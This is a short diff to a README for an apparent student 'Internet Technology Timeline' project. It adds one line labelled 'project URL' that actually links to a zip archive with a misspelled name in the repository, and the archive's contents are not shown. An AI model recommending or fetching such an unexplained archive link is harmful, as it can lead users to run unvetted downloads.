@@ -24,3 +24,4 @@ What makes this project unique is that the original timeline was intended for st
 ->Flaticon (for event icons)
 
 **Note:** The images folder includes the .PNG files for all the icons used.
+project URL:https://github.com/SallyAboulhosn2001/Internet-Technology-Timeline/blob/main/timeline%20chnagelog.zip
